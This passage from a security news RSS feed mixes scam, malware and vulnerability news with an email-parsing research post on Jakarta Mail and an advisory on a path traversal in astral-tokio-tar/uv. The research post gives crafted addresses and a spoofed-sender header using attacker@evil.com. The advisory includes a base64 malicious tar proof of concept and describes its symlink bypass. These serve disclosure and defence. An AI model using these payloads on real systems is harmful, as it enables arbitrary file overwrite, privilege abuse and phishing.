seller’s claimed country of origin. Even on platforms like Amazon or eBay that offer buyer protection, resolving disputes can take a while to resolve.Drop-shipping also raises data privacy concerns. Third-party sellers in other jurisdictions might receive your personal address and phone number directly. With little enforcement across borders, this data could be reused or leaked into marketing lists. In some cases, multiple resellers have access to the same dataset, amplifying the risk.In the case of the watches, other users said they were pushed to install Chinese-made apps with different names than the brand of the watch.. We’ve talked before about the risks that come with installing unknown apps.A few quick checks can spare you a lot of trouble.Research unfamiliar sellers, especially if the price looks too good to be true.Check where the goods ship from before placing an order.Use payment methods with strong buyer protection.Stick with platforms that verify sellers and offer clear refund policies. for unexpected shipping fees, extra charges, or requests for more personal information after you buy.Drop-shipping can be legitimate when done well, but when it isn’t, it shifts nearly all risk to the buyer. And when counterfeits, privacy issues and surprise fees intersect, the “deal” is your data, your safety, or your patience.If you’re unsure about an ad, you can always submit it to Malwarebytes Scam Guard. It’ll help you figure out whether the offer is safe to pursue.And when buying any kind of smart device that needs you to download an app, it’s worth remembering these actions:Question the permissions an app asks for. Does it serve a purpose for you, the user, or is it just some vendor being nosy?Read the privacy policy—yes, really. Sometimes they’re surprisingly revealing.Don’t hand over personal data manufacturers don’t need. What’s in it for you, and what’s the price you’re going to pay? They may need your name for the warranty, but your gender, age, and (most of the time) your address isn’t needed.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products. Submit a screenshot, paste suspicious content, or share a text or phone number, and we’ll tell you if it’s a scam or legit. Download Malwarebytes Mobile Security for iOS or Android and try it today!]]></content:encoded></item><item><title>Beyond IAM Silos: Why the Identity Security Fabric is Essential for Securing AI and Non-Human Identities</title><link>https://thehackernews.com/2025/11/beyond-iam-silos-why-identity-security.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgn3vLGW3cKs0sXmT_QUktr7Z215KSU8vCThbvHlJBUE4N6-71iTYrw0cLUuNXDvetFmi6LXIty3NNmvIpTE8BVwIDhyphenhyphenSqbFm0CsolT7lA7I5ai92hcjLp8ew4bJUqhjsx_pY6KKzLz6_UJSSpvdVG_CW9Yau1XmZVZRYuoEIiB3KONNQsy09vhf9D3ySg/s1600/Identity-Security-Fabric.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 11:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Identity security fabric (ISF) is a unified architectural framework that brings together disparate identity capabilities. Through ISF, identity governance and administration (IGA), access management (AM), privileged access management (PAM), and identity threat detection and response (ITDR) are all integrated into a single, cohesive control plane.
Building on Gartner’s definition of “identity]]></content:encoded></item><item><title>Seven npm Packages Use Adspect Cloaking to Trick Victims Into Crypto Scam Pages</title><link>https://thehackernews.com/2025/11/seven-npm-packages-use-adspect-cloaking.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrQ7iCz7VpB_JXNQKdG7MzL3-W7RzL9PSlbgktyxA2fZYJGJ8lVtKsoJeFD9LgconGlK9MhuRrWUN26eMkd44zv3ro7VmulplS_0L9BxtQCCC1d4HnmwnWjM0cAl9N8ysY9KfG1A4l-cOIiinzlHJLoDOoTeHG2XwgtVh6bw1MPdFyhSTbBUfvOIWK1BaG/s1600/crypto-scams.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 10:37:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have discovered a set of seven npm packages published by a single threat actor that leverages a cloaking service called Adspect to differentiate between real victims and security researchers to ultimately redirect them to sketchy crypto-themed sites.
The malicious npm packages, published by a threat actor named "dino_reborn" between September and November 2025, are]]></content:encoded></item><item><title>Gotchas in Email Parsing - Lessons from Jakarta Mail</title><link>https://www.elttam.com/blog/jakarta-mail-primitives/</link><author>/u/AnimalStrange</author><category>netsec</category><pubDate>Tue, 18 Nov 2025 10:06:04 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[(If you are looking for the Jakarta Mail checklist, it is at the end of this post.)During a recent client engagement, I chanced upon a portion of their code that relied on Jakarta Mail’s InternetAddress.java constructor to verify if an input string is a valid email address. Upon looking closer at the constructors (there were multiple), I realised that their behaviours were not consistent.This inconsistent parsing could lead to high risk vulnerabilities depending on how an application is using email addresses.
For example, an application may grant privileged access if the supplied email is from a particular domain.
What happens if an attacker registers and verifies their email address that belongs to their own domain, but somehow satisfies the aforementioned criteria?In this blog, we will be looking at interesting “features” this library has to offer. We will also examine how Hibernate’s  annotation behaves when performing email address validation.At the end of this post, there is a handy checklist that should be helpful when auditing an application that uses Jakarta Mail. We have also created custom Semgrep rules to help you identify these primitives.When I dived into Jakarta Mail, I remembered that Gareth Heyes from PortSwigger published an extensive write-up about email parsing, so I wanted to extend his research.
Part of the write-up mentioned how encoded strings can be used to “split” email address parsing.There is also a write-up by Nathan Davison about email parsing differential that he found with AWS SES.
This behaviour was also observed in Jakarta Mail due to the way parsing was done to ensure RFC-compliance.
We will be looking at it in detail in this post, but the gist is that if a supplied email address looks like , the actual email will be sent to  in accordance with RFC 822.Finally, Elliot Alderson also has an interesting write-up about how an “overloaded” email address passed the application’s flawed checks.
For example, it naively checks that the email address ends with  but when an email address like tester@protonmail.com@presidence@elysee.fr is supplied, the actual emails are sent to .Background on Jakarta MailJakarta Mail is part of the Jakarta EE platform, which is a set of API specifications for frameworks looking to be Jakarta EE-compliant.
As of Jakarta Mail version , Angus Mail by the Eclipse Foundation is a compliant framework.
Its specification page can be found here.Note that even though Jakarta Mail is intended to be a set of specifications, it comes with default implementations of Classes such as , , , etc. and these default classes are what we will be looking at.In the  class, it is stated that email address validation complies with RFC 822 and that the “Personal Name” field complies with RFC 2047 (encoded strings).Encoded Strings (RFC 2047)What are these? The TL;DR is that encoded strings are a way to represent and transport non-ASCII characters by encoding them.
The write-up by Gareth goes into great detail and does an excellent job in explaining what encoded strings are.Simply put, an encoded string has the following syntax:=?charset?encoding?encoded-text?=
 are start and end anchors, and  act as delimiters indicates the character set of the encoded text (e.g. UTF-8) is either  (base-64) or  (quoted) to indicate the encoding type being the text encoded by the chosen encodingThe following is an example of an email address containing an encoded string:=?utf-8?q?hello=77=6f=72=6c=64?=@example.com
 – start/end markers –  (helloworld)It will be resolved to  by email parsers.InternetAddress Primitives is shipped with the Jakarta Mail library and thus most Java applications that work with email addresses will most likely import this library.I’ve noted that there were multiple constructors for the  class intended for different scenarios, and here is the one for the single string argument constructor.Nothing unusual with the code here.
It seems like the intention is to take in an email address string and call the  method, which validates the email address for RFC 822 compliance.
Afterwards, the email address and personal name will be assigned to the object itself.What about the 2-argument and 3-argument constructors?Astute readers will immediately notice the issue here - the input  is directly assigned to the object itself without calling the  method to parse it!This was indeed the case from testing:This means that if an application uses any of these constructors and assumes that the email address will be validated for RFC-compliance, they are sorely mistaken! 🙈Email Address Parsing DifferentialSpeaking of validating an email for RFC-compliance, where do you think an email sent to the following address will end up at?If you want to be compliant with RFC-822 (and its successors), you will send the email to :Received Email: <aaa@bbb.com>ccc@ddd.com

=====

getAddress(): aaa@bbb.com
getPersonal(): null
toString(): aaa@bbb.com
However, developers may think that the email address is  or .
This differential is what leads us to high impact vulnerabilities!Imagine the following scenario: there’s an application that identifies users via their email address.
It also grants special privileges to accounts originating from the  domain.
If the registration is not restrictive enough, we could register with an email address similar to the earlier example (<attacker@example.com>@foo.com).
Let’s also assume that when granting special privileges, the application does a simple match with  to look for the  domain.
It also trusts that the  constructor ensures that the input is a valid email string.But what is a valid email string?The  certainly thinks <attacker@example.com>@foo.com is valid and will happily send the verification email to .
Meanwhile, the application identifies the user as <attacker@example.com>@foo.com, sees that it is from  and grants it special privileges!The InternetAddress.getGroup() method returns an array of  from its current group address.
So what is a group address?It is basically a string with the following syntax:group-name:[addr1, addr2 …];
Where a group name is supplied, followed by a colon.
Then, 0 or more email addresses are included with commas used as delimiters.
The entire sequence is then terminated with a semicolon.Parsing a group address typically looks like:Received Email: a:ccc@ddd.com,eee@fff.com,ggg@hhh.com;
Size of Addresses: 3

=====

getAddress(): ccc@ddd.com
getPersonal(): null
toString(): ccc@ddd.com

=====

getAddress(): eee@fff.com
getPersonal(): null
toString(): eee@fff.com

=====

getAddress(): ggg@hhh.com
getPersonal(): null
toString(): ggg@hhh.com
A group address will be parsed successfully through the  method and could potentially lead to more differential issues or even ReDoS, depending on how the application uses the input string that gets passed to . is also a default class shipped with Jakarta Mail.
It is used to represent the message envelope, which includes the email headers and body.What’s interesting here is that when parsing certain email headers such as ,  and ,  will call InternetAddress.parseHeader() to process the input.
Within InternetAddress.parseHeader(), it calls .
This means that primitives applicable to  are also accessible through .
For example, when parsing complex email addresses like  or email addresses with encoded strings.To do this,  has constructors that take in an email envelope as input and parses its headers.
If you happen to come across applications calling any of the following MimeMessage constructors with user-supplied email envelopes, be sure to take a closer look at how it uses the input from these headers:A potential abuse scenario would be if an email application does not show the raw encoded string in their user interface and displays the Personal Name section first.
This could lead to phishing emails appearing legitimate.
Take the following email envelope for example:From: =?UTF-8?Q?Administrator_=3Cadmin@example.com=3E?= <attacker@evil.com>
To: victim@example.com
Subject: =?UTF-8?Q?Administrator_=3Cadmin@example.com=3E?=
Content-Type: text/plain; charset=UTF-8

Your account needs verification.
The  constructor will parse the envelope above and when the  and  methods are called, the decoded strings will be shown:getSubject(): Administrator <admin@example.com>
getPersonal(): Administrator <admin@example.com>
If the email application happens to display the sender’s email as Personal Name <Email Address>, the Personal Name section can be crafted like the above example and to trick end-users into thinking that it is from a legitimate sender.
Of course, this is just an example to demonstrate the importance of verifying how applications utilises  and its methods.The MimeMessage.getRecipients() method retrieves a specified header value from the email envelope.
This header can be either , ,  or .
In the latter’s case, the  method will be invoked to retrieve the values from the  header.
This method also concatenates values from duplicate headers with a comma delimiter.In the  method, it basically splits the input string by commas and inserts them into an arraylist of  objects:At [1], an interesting behaviour can be found in the  constructor, which is shown below:A malformed input would not throw any exceptions and would silently be assigned anyway.
Even the comments says that an exception should be thrown 🤔Spring Framework ()The root-level package for Spring Framework’s email support.
The classes found in this package all utilise Jakarta Mail in one way or another.This class is used to prepare a  object using a supplied email address string:Looking at [1], it simply passes the input string to the  constructor (only the 1-argument constructor, unfortunately).
This means that the Personal Name field will be decoded if it is an encoded string.
Again, a potential misuse of this behaviour would be phishing attacks.
If an application shows the Personal Name section of an email address, we can make it look like the email came from a legitimate sender.InternetAddressEditor editor = new InternetAddressEditor();
editor.setAsText("=?UTF-8?Q?Administrator_=3Cadmin@example.com=3E?= <attacker@evil.com>");
InternetAddress address = (InternetAddress) editor.getValue();

address.getPersonal(); // Administrator <admin@example.com>
address.getAddress(); // attacker@evil.com
This is a library that introduces the  annotation to verify that the string follows a valid email format.
As we now know that “valid email format” can potentially mean complex looking email addresses, we should go ahead and verify what constitutes a “valid email” in the eyes of Hibernate.Developers can specify custom regex patterns (via ), or use the default pattern.
What I’ve found was that the default pattern is very restrictive and is  RFC 2047 compliant (no encoded strings 🙁).When validation is triggered via the  annotation, the EmailValidator class is used to perform the checks.
It then calls its parent class  to validate the email string, which also uses DomainNameUtil to perform domain name validation.In the default regex, validation is split into two sections: local and domain, where the former is everything before the  while the latter is everything after.
It gets really intense as seen below:With a bit of experimentation, I found that the email address "foo@bar.com@"@example.com will pass the default regex validation.
This means that if an application naively checks the domain of an email address with , it will pull the incorrect domain.If you have made it this far, I hope you have learnt something new and/or have some research ideas on your own about email parsers. Note that the ideas we have explored are not limited to Jakarta Mail but can be extended to any application that uses email addresses to establish identities. As long as developers are not fully aware of how the libraries they are using are parsing email addresses, there will always be the possibility of email parsing differentials.The next time you encounter Jakarta Mail or any libraries that uses it, be sure to take a closer look to see if the application makes any assumptions about how emails are parsed by this library. If only there are some Semgrep rules to help you out… oh wait - here it is!This blog post is based on the talks that I gave in BSides Canberra and BSides Perth 2025. You can find the slide deck here.Checklist for Jakarta MailA list of primitives to look out for.]]></content:encoded></item><item><title>Microsoft Mitigates Record 15.72 Tbps DDoS Attack Driven by AISURU Botnet</title><link>https://thehackernews.com/2025/11/microsoft-mitigates-record-572-tbps.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2dO5PMH9gIwAVDF-XFgn5ydvp3uKTXTcpVHUMVoYtn02VkUCLM3d43lZH2KJMaoDkE2jZeroOAmDeoUnbTP_V7nONKGdkOGG5SlK4VBzY90xNuwT4IUv44rFNMpPo7x2zlFcVa4Kz1tyVMtEjWFCjX0Spsm3YvR8Jl2UlJXmokwESYjLXEzoBWJe07tq3/s1600/ddos.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 08:17:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Microsoft on Monday disclosed that it automatically detected and neutralized a distributed denial-of-service (DDoS) attack targeting a single endpoint in Australia that measured 15.72 terabits per second (Tbps) and nearly 3.64 billion packets per second (pps).
The tech giant said it was the largest DDoS attack ever observed in the cloud, and that it originated from a TurboMirai-class Internet of]]></content:encoded></item><item><title>KongTuke activity, (Tue, Nov 18th)</title><link>https://isc.sans.edu/diary/rss/32498</link><author></author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 07:10:17 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Defeating BLOCKADE SPIDER: How CrowdStrike Stops Cross-Domain Attacks</title><link>https://www.crowdstrike.com/en-us/blog/defeating-blockade-spider-how-crowdstrike-stops-cross-domain-attacks/</link><author>Chris Prall</author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Defeating BLOCKADE SPIDER: How CrowdStrike Stops Cross-Domain Attacks</title><link>https://www.crowdstrike.com/en-us/blog/defeating-blockade-spider-how-crowdstrike-stops-cross-domain-attacks/</link><author>Chris Prall</author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Defeating BLOCKADE SPIDER: How CrowdStrike Stops Cross-Domain Attacks</title><link>https://www.crowdstrike.com/en-us/blog/defeating-blockade-spider-how-crowdstrike-stops-cross-domain-attacks/</link><author>Chris Prall</author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Defeating BLOCKADE SPIDER: How CrowdStrike Stops Cross-Domain Attacks</title><link>https://www.crowdstrike.com/en-us/blog/defeating-blockade-spider-how-crowdstrike-stops-cross-domain-attacks/</link><author>Chris Prall</author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Google Issues Security Fix for Actively Exploited Chrome V8 Zero-Day Vulnerability</title><link>https://thehackernews.com/2025/11/google-issues-security-fix-for-actively.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCEgNFzAj-mvy7UDCWYkUmxoSH_SYIJy6THFdmON12TKz7oNg_mQSAi4lNK-5NI1tG8106ieRb4dnWK8CNK2mOlkzK0HuyltjU237Z_oNH0sOJa1ZAUHlXQmzVEczd50DCfo4zpTN6nAqdVZoK9ZSqYK8LIgU0SeIgQWyoH7u0KOKTjnXgWga6e7a_ftvh/s1600/chrome-zeroday.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 04:44:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google on Monday released security updates for its Chrome browser to address two security flaws, including one that has come under active exploitation in the wild.
The vulnerability in question is CVE-2025-13223 (CVSS score: 8.8), a type confusion vulnerability in the V8 JavaScript and WebAssembly engine that could be exploited to achieve arbitrary code execution or program crashes.
"Type]]></content:encoded></item><item><title>ISC Stormcast For Tuesday, November 18th, 2025 https://isc.sans.edu/podcastdetail/9704, (Tue, Nov 18th)</title><link>https://isc.sans.edu/diary/rss/32496</link><author></author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Addressing the vulnerability prioritization challenge</title><link>https://www.recordedfuture.com/blog/addressing-the-vulnerability-prioritization-challenge</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_182edadffd3e984b13663e305ab0f61d712b8c845.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Tue, 18 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[How do you prioritize what vulnerabilities to patch when you have thousands of alerts and critical remote code execution flaws buried next to low-priority information disclosures?MITRE's CVE List grows by dozens or even hundreds of entries daily. Your team can’t patch everything.With some organizations facing tens of thousands of vulnerability alerts each month, it’s clear that detection isn't the problem anymore. The challenge that keeps vulnerability management teams up at night is prioritization. With limited resources and maintenance windows, you can't patch everything immediately. You need to know what matters most.Relying on universal CVSS scores that aren't specific to your organization won't solve this prioritization challenge. A vulnerability might score 9.8 on the CVSS scale, suggesting catastrophic risk, yet never be exploited in the wild. Meanwhile, a 7.5-rated vulnerability could be actively fueling ransomware campaigns targeting your industry right now.Why CVSS alone falls shortCVSS serves a purpose. It provides a standardized way to measure the theoretical severity of vulnerabilities based on their technical characteristics. It tells you how bad things could get if someone exploits a vulnerability under ideal conditions. That's valuable information, but it's only part of the story.CVSS can't tell you whether cybercriminals are actively exploiting a vulnerability. It doesn't know if ransomware groups have weaponized it or if working exploit code is circulating in the wild. It can't assess whether a vulnerability affects your critical payment processing systems or an isolated test server. And it certainly can't determine whether you can actually deploy a patch without breaking essential business operations.This gap between theoretical risk and practical reality creates a dangerous blind spot. Teams end up in one of two traps: either they try to patch everything rated "critical" or "high," burning out their staff and disrupting operations, or they become numb to the constant stream of high scores and miss the vulnerabilities that truly matter.The solution isn't to abandon CVSS. The solution is to enhance it with real-world context. You need a framework that answers the questions CVSS can't address. That's where the three-pillar approach transforms vulnerability management from overwhelming to actionable.The three-pillar framework: your guide to modern prioritizationThe three-pillar framework provides a systematic approach to cut through the noise, identify what truly requires immediate action, and clearly communicate the evidence to defend those decisions to patching teams and leadership.Each pillar answers a fundamental question that transforms raw vulnerability data into actionable intelligence. Together, they help give you the context needed to confidently prioritize your patching efforts and communicate those priorities to stakeholders who need to understand why certain vulnerabilities jump to the front of the queue.Intelligence pillar: how likely is exploitation?The first pillar shifts your focus from theoretical to actual risk. While CVSS measures how severe a vulnerability could be in theory, the intelligence pillar asks the questions that matter in practice for your organization:Is anyone actually exploiting this vulnerability?Are ransomware groups using it in active campaigns?Does proof-of-concept (PoC) code exist in the wild?Is exploitation trending upward or remaining dormant?Consider this scenario, your scanner flags two vulnerabilities:The first has a CVSS score of 10, but it’s never been observed in real-world attacks.The second has a CVSS of 7.5 but appears in ongoing ransomware campaigns targeting organizations in your industry.Which deserves your immediate attention? The intelligence pillar provides the critical context that the second vulnerability may take priority.The Intelligence pillar provides this critical context. It transforms abstract severity scores into actionable threat intelligence by revealing which vulnerabilities are actually being exploited in the wild. Without this intelligence layer, you're essentially patching blind, potentially spending weeks addressing theoretical risks while missing the vulnerabilities criminals are actively using.Environmental pillar: what’s your specific risk?A vulnerability doesn't exist in isolation. Where it lives in your environment determines its actual risk to your organization. The Environmental pillar forces you to map generic vulnerability data to your specific infrastructure and business context.The same vulnerability presents vastly different risk profiles depending on its location:Is it on an internet-facing payment server or an air-gapped development system?Does it affect one legacy application or your entire server fleet?Are the vulnerable systems processing customer data or internal test data?Do these systems connect to critical business partners or operate in isolation?Scale matters too. A CVSS 9.0 vulnerability affecting one isolated system generally poses less organizational risk than the same vulnerability present across hundreds of production servers. When two vulnerabilities have equal severity and exploitation likelihood, the one touching more assets typically deserves priority. More exposure points mean more opportunities for compromise and greater remediation complexity.CVSS treats every vulnerability as equal, yet modern vulnerability management teams have learned that environmental context proves otherwise. A SQL injection vulnerability on your public e-commerce platform demands different treatment than the same flaw on an internal reporting tool. The environmental pillar captures these crucial distinctions.By mapping vulnerabilities to your actual infrastructure, you move from broad categorizations to precise, business-aligned priorities. This isn't about making excuses for delayed patching. It's about ensuring your limited resources protect what matters most to your organization.Organizational pillar: can you actually fix it?Even the most critical vulnerability becomes meaningless if you can't address it. The Organizational pillar acknowledges a reality that pure risk scoring ignores: your ability to actually implement fixes varies dramatically across your infrastructure.This pillar addresses practical constraints:Does a patch exist from the vendor?Will deploying it break critical business operations?Do you have administrative access to the affected systems?Can you meet change control requirements for production systems?Are there compensating controls that reduce risk without patching?Resource limitations shape what's possible:Your single vulnerability management engineer can't tackle the same volume as a dedicated team of ten.Budget constraints might prevent upgrading legacy systems.Maintenance windows might only occur quarterly for critical infrastructure.For better or worse, these realities determine which vulnerabilities you can meaningfully address.The organizational pillar transforms these constraints into strategic advantages by focusing efforts where you can achieve real risk reduction rather than pretending every vulnerability is equally fixable. This means prioritizing ten medium-severity vulnerabilities you can patch this weekend over a critical vulnerability requiring a six-month system overhaul, while also revealing opportunities for alternative risk reduction. By acknowledging what you can't change, you identify creative solutions for what you can control.This doesn’t mean you should disregard vulnerabilities you cannot immediately patch. Adding these to a watch list ensures you're alerted when their risk profile changes; when proof-of-concept code appears, exploitation becomes likely, or active attacks begin. This heightened awareness lets you adjust compensating controls or expedite remediation efforts as the threat landscape evolves.Most importantly, this pillar provides the business context that resonates with leadership. When you explain that fixing vulnerability X requires shutting down manufacturing for a week while vulnerability Y can be addressed during normal maintenance, priorities become clear. You're not making excuses. You're making informed business decisions about risk.Transforming communication and actionArmed with insights from all three pillars, you transform how you communicate about vulnerabilities both within your security team and to leadership. This targeted, evidence-based approach cuts through patch fatigue and clearly articulates why specific vulnerabilities demand immediate attention.Stop saying: "We have 1,000 critical vulnerabilities to patch this month."Start saying: "We've identified 10 vulnerabilities being actively exploited by three ransomware groups that specifically target financial services organizations. Eight affect our payment processing systems, and we can patch them this weekend. Two require vendor fixes we're tracking closely, but we've implemented network segmentation to reduce exposure."This specificity matters. When you can show leadership that APT groups with proven intent to target your industry are actively exploiting certain vulnerabilities, priorities become crystal clear. You're not just citing CVSS scores; you're demonstrating real threats from real adversaries using real attack methods.This communication shift works at every level:Focus on business impact and risk reduction, not technical scores.Provide clear justification for emergency patches versus planned updates.Explain why certain fixes need priority in the next sprint.Demonstrate a mature, risk-based approach to vulnerability managementWhen you ground your recommendations in real-world exploitation data, business context, and practical constraints, you build credibility. Teams stop seeing vulnerability management as crying wolf about every high CVSS score. Instead, they recognize you as a strategic partner who understands both security risks and business realities.Making the three pillars work: the role of intelligenceThe three-pillar framework transforms vulnerability prioritization, but requires comprehensive, real-time threat intelligence to avoid guesswork. Manually researching thousands of vulnerabilities for exploitation evidence, mapping them to your environment, and tracking patches isn't sustainable. Teams need continuously updated, contextually relevant intelligence that's immediately actionable through automation to leverage this framework.Recorded Future's Vulnerability Intelligence Module delivers real-time exploitation data from across the web, tracking vulnerabilities from proof-of-concept to active threat actor use.Dynamic risk scoring automatically factors in your environmental context and organizational constraints. Lifecycle monitoring alerts you the moment patches become available or exploitation begins. Threat Maps visualize which actors target your industry and the CVEs they’re exploiting to do so, helping you correlate your vulnerabilities with attackers' specific TTPs.Organizations using Vulnerability Intelligence report saving 15.9 hours per week on investigation and achieving 86% reduction in unplanned downtime. Instead of drowning in CVSS scores, these teams know exactly which exposures demand immediate attention and can articulate why. They patch what matters before it impacts their business.Ready to see the three-pillar framework in action? Watch our workshop webinar where security experts demonstrate how Vulnerability Intelligence transforms overwhelming vulnerability data into clear, defensible priorities that protect what matters most. If you are a current user interested in learning more about how your team can more effectively prioritize Alerts with Vulnerability Intelligence, reach out to your Customer Success Manager to schedule a consultation.]]></content:encoded></item><item><title>&quot;Astral-tokio-tar&quot; / &quot;uv&quot; Arbitrary Write Path Traversal Vulnerability</title><link>https://github.com/google/security-research/security/advisories/GHSA-9p78-p5g6-gcj8</link><author>rcorrea35</author><category>vulns</category><pubDate>Mon, 17 Nov 2025 23:59:04 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[**security-research** Public

# "Astral-tokio-tar" / "uv" Arbitrary Write Path Traversal Vulnerability

## Package

## Affected versions

## Patched versions

## Description

### Summary

"astral-tokio-tar", a Rust crate used by the popular tool "uv", has a vulnerability that allows arbitrary file writes when unpacking tar files. In "uv" this vulnerability allows a Python source distribution to write anywhere during extraction.

This vulnerability is primarily due to astral-tokio-tar's support of symlinks and the "memoized set" behavior that skips path validation on previously observed and validated paths.

Since a symlink can point to a directory, and can be changed by having multiple entries in the tar file, it is possible to create a symlink to a benign directory under the destination path, have it validated, added to the memoized set, and then change the symlink to another arbitrary directory anywhere on disk.

Additionally a symlink that points to an arbitrary directory and bypasses any validation can be created by using two symlinks, where the first symlink created depends on the second symlink to bypass validation.

This vulnerability allows an attacker to generate tar files that can create or change arbitrary files on the filesystem.

### Severity

Medium - Due to the potential for arbitrary code execution.

### Proof of Concept

```
mkdir /tmp/flag $ echo "hello" > /tmp/flag/flag $ ls /tmp/flag flag $ echo "H4sICOmxkWgCA2R1bW15cGFja2FnZS0wLjAuMS50YXIA7Zhra9swGIX92b9C86cNGsWSZasLbeku7MJYVxjsSwlBSdTUm29znLZh7L9PcrIm3ZousNQN7XkIsZFesMl5j44U2qbtw2N1+U6roS6dO8Gfserq+4FY3Ntx5nPGHXLpNMBkXKnSPN55nPBdklZxqveZDEUgpdiVNOAB5xF3HfDgGU7SdFqowTc10i2f+pS1l4favV6cxVWvR4vpf/k/EmK1/5l0WOgLEfBImHufhZFkDvHh/zunKOOseuq9tpp7z2D5xwbdivwP/s5/hvxvJP/l9fwPeUDl8yiUu1gLHmn+F9OizL/qQUWrPE025P/b8j8IxSL/I1PHhF0SkP8NcNKfxMmwNZ6OK5123VJ/n8SlHpN9cuKdJmbnN8hLTQ72A8p39oTXdWf1fdMxOhuaskUVradUEXuuezJvoa6bqVTbsuVG81w1qc7ysn7Mj98Vr1Si++RlmV9k3g7RqYoTOzyww307ejjK81Gi6SBPvZ9d91yX4zjPbE3duJ471ONBGRfVfNQIOybKvP6ZKofmpeD2tfx//OFt6/3Rm08bzf/b/M999kf+cxYI+L8JPupKDVWlWl9mbuoQToV7ZCzZIcu94V7N103ifjZzqpx2yDWTuS9qX7dq83bIkqPJ3o0+PoApt+/8rwf5tL3h/b/ZWTr1ST9k8yu/5vlZ/ge+YOYswKJAcIeETfp/0Z431/1r/gHt/6oNnwNn+sv19A/t/k/6LHQIrzsR+jev/+w/wI3mfyTW018yqz9jTec/9N8K/0e+Wf8DLiLr/yzPi/a6X5Su/FRp0T5N1Aj6r6O//TXvSX8ujfQ2/zmTRn8K/9/T+r/KLXez/jN+5X/JudU/klj/GyE/1+VFGVcaBzGc/xb+z/TFaZzopvzPFv4PrP+lwP6vGeZCP4H9AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADYfn4BXGg1JABQAAA=" | base64 -d > dummypackage-0.0.1.tar.gz $ mkdir test $ cd test $ uv venv env $ . env/bin/activate $ uv pip install ../[dummypackage-0.0.1.tar.gz](http://dummypackage-0.0.1.tar.gz/) Using Python 3.12.3 environment at: env Resolved 1 package in 5ms Built dummypackage @ file:///home/calebbrown/dummypackage-0.0.1.tar.gz Prepared 1 package in 474ms Installed 1 package in 0.95ms + dummypackage==0.0.1 (from file:///home/calebbrown/dummypackage-0.0.1.tar.gz) $ ls /tmp/flag flag newfile $ cat /tmp/flag/flag overwrite $ cat /tmp/flag/newfile newfile!
```

### Further Analysis

#### Root Cause

##### Parent Memorization

The "astral-tokio-tar" method `Entry.unpack_in_raw()` was added to the library in v0.5.0 to allow a memoized set to be passed in as an argument, to improve the performance of filesystem operations.

In "uv", the method `untar_in()` in uv-extract creates a memoized set and uses the same set while extracting every entry in a tar file with `Entry.unpack_in_raw()`.

The memoized set is used in `EntryFields.unpack_in()` with the following logic:

```
// Validate the parent, if we haven't seen it yet. if !memo.contains(parent) { self.ensure_dir_created(dst, parent).await.map_err(|e| { TarError::new(format!("failed to create `{}`", parent.display()), e) })?; self.validate_inside_dst(dst, parent).await?; memo.insert(parent.to_path_buf()); }
```

In this context `parent` is the parent directory for the entry currently being extracted. So, if `file_dst` is `"path/to/file.txt"` then `parent` would be `"path/to"`.

The call to `self.validate_inside_dst(dst, parent)` is only made if `parent` is not yet in `memo`.

We can use a symlink to change the effective `parent`, after it has been added to `memo`.

Symlinks allow other paths to be referred to indirectly using a file-like object. This means that a path, using a symlink can have a `parent` that passes the validation, populating `parent` in `memo`.

The symlink can then be replaced with another symlink, and since the name of the symlink has not changed, the check is now skipped.

##### Symlink Check Bypass

astral-tokio-tar has a check guarded by the `allow_external_symlinks` flag that attempts to ensure that symlinks do not point outside the destination directory `dst`. However, this check can also be bypassed by creating the two symlinks below in order:

1. `"ptr"`-> `"noop/noop/noop/noop/noop/noop/noop/noop/noop/../../../../../../../../../tmp"`    1. This path passes the symlink check as it evaluates "tmp", under the destination directory.
2. `"noop"`-\> "."

